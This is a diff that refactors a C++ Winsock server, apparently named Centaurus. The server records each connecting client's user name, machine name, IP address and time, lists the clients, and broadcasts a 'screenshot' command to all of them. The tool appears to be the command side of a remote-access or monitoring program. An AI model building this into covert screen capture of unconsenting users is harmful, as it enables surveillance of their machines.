@@ -74,20 +74,25 @@ void Server::start() {
 void Server::stop() {
     m_serverRunning = false;
 
-    for (SOCKET sock : m_clientSockets)
+    for (const auto& client : m_clients)
     {
-        send(sock, "exit", 4, 0);
-        closesocket(sock);
+        send(client.sock, "exit", 4, 0);
+        closesocket(client.sock);
     }
 
     closesocket(m_listeningSocket);
     WSACleanup();
 }
 
-void Server::CopyReceivedString(const char* source, char* destination, size_t destSize) {
-    if (source) {
-        strncpy(destination, source, destSize - 1);
+void Server::CopyReceivedString(const std::string& source, char* destination, size_t destSize) {
+    if (!source.empty())
+    {
+        std::strncpy(destination, source.c_str(), destSize - 1);
         destination[destSize - 1] = '\0';
+    }
+    else
+    {
+        destination[0] = '\0';
     }
 }
 
@@ -102,19 +107,27 @@ void Server::handleClient(const SOCKET clientSocket) {
         std::string command = receiveString(clientSocket);
 
         if (command.empty()) {
-            std::cout << "Client disconnected." << clientInfo;
+            std::cout << "Client disconnected.\n" << clientInfo;
+            m_clients.erase(std::remove_if(m_clients.begin(), m_clients.end(),
+                [clientSocket](const FClientInfo& client)
+                {
+                    return client.sock == clientSocket;
+                }), m_clients.end());
+
             break;
         }
-        if (command == "/connect") {
-            char* receivedTime = receiveString(clientSocket);
-            char* receivedUser = receiveString(clientSocket);
-            char* receivedName = receiveString(clientSocket);
-            char* receivedIPv4 = receiveString(clientSocket);
+        if (command == Centaurus::cmd::connect) {
+            std::string receivedTime = receiveString(clientSocket);
+            std::string receivedUser = receiveString(clientSocket);
+            std::string receivedName = receiveString(clientSocket);
+            std::string receivedIPv4 = receiveString(clientSocket);
 
             CopyReceivedString(receivedTime, clientInfo.time, sizeof(clientInfo.time));
             CopyReceivedString(receivedUser, clientInfo.user, sizeof(clientInfo.user));
             CopyReceivedString(receivedName, clientInfo.name, sizeof(clientInfo.name));
             CopyReceivedString(receivedIPv4, clientInfo.ipv4, sizeof(clientInfo.ipv4));
+            
+            m_clients.push_back(clientInfo);
             
             std::cout << "Client connected:\n" << clientInfo;
         }
@@ -164,24 +177,20 @@ std::vector<char> Server::receiveData(SOCKET clientSocket, int dataSize) {
     return buffer;
 }
 
-char* Server::receiveString(SOCKET clientSocket) {
+std::string Server::receiveString(SOCKET clientSocket) {
     int strSize;
     int sizeReceived = recv(clientSocket, reinterpret_cast<char*>(&strSize), sizeof(strSize), 0);
-    if (sizeReceived == SOCKET_ERROR) {
+    if (sizeReceived == SOCKET_ERROR || strSize <= 0) {
         std::cerr << "Failed to receive string size, error: " << WSAGetLastError() << std::endl;
-        return nullptr;
+        return "";
     }
 
     std::vector<char> stringData = receiveData(clientSocket, strSize);
     if (stringData.empty()) {
-        return nullptr;
+        return "";
     }
 
-    char* buffer = new char[strSize + 1];
-    std::copy(stringData.begin(), stringData.end(), buffer);
-    buffer[strSize] = '\0';
-
-    return buffer;
+    return std::string(stringData.begin(), stringData.end());
 }
 
 
@@ -200,8 +209,9 @@ void Server::acceptClients() {
             std::cerr << "Invalid client socket" << std::endl;
             continue;
         }
-
-        m_clientSockets.push_back(clientSocket);
+        
+        m_clients.emplace_back();
+        m_clients.back().sock = clientSocket;
         m_clientThreads.emplace_back(&Server::handleClient, this, clientSocket);
     }
 }
@@ -217,19 +227,19 @@ void Server::processCommands() {
 
         if (command == Centaurus::cmd::screenshot)
         {
-            for (SOCKET sock : m_clientSockets)
+            for (const auto &client : m_clients)
             {
-                send(sock, command.c_str(), command.size() + 1, 0);
+                send(client.sock, command.c_str(), command.size() + 1, 0);
             }
         }
         else if (command == Centaurus::cmd::list)
         {
             std::cout << "Connected clients:" << '\n';
-            // for (const auto& ip : m_clientIPs) {
-            //     std::cout << ip << std::endl;
-            // }
+            for (const auto& client : m_clients) {
+                std::cout << client;
+            }
         }
-        else if (command == Centaurus::cmd::exit || command == Centaurus::cmd::quit)
+        else if (command == Centaurus::cmd::exit)
         {
             stop();
         }
